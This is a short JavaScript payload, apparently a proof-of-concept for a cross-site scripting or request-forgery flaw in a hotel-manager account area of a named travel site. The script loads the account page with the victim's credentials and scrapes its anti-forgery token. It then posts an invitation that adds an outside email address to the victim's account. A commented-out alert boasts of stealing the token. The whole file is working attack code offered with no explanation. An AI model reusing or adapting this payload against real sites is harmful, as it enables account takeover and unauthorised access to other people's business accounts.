
function inviteMe()
{
var fetchHash = new XMLHttpRequest();

var url = "https://www.trivago.com/hotelmanager/account/management";
var datax;
var all_elements;
var vc_email_token='initial';

fetchHash.onreadystatechange=function ()
{
if(fetchHash.readyState==4 && fetchHash.status==200)
        {

            datax = fetchHash.responseText;
                       var loot = document.createElement('html');
					   loot.innerHTML = datax;
					   all_elements = loot.getElementsByTagName( 'input' );
					   vc_email_token = all_elements[1].value;
					   //alert('Stole your Email change Token: '+vc_email_token+' ...Tabahi');
					   hack(vc_email_token);


        }

}

fetchHash.open("GET",url, true);
fetchHash.withCredentials=true;
fetchHash.send();
}

inviteMe();



function hack(csrftoken)
{
	
var HackAccount = new XMLHttpRequest();

url= "https://www.trivago.com/hotelmanager/account/management/invite";

HackAccount .open("POST",url, true);

HackAccount .withCredentials=true;

var data= 'accountInvitation%5Bemail%5D=jacob.weiler@mail.com&accountInvitation%5B_token%5D='+csrftoken ;

HackAccount.setRequestHeader('X-Requested-With','XMLHttpRequest');

HackAccount.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
HackAccount.send(data);	
	
	
}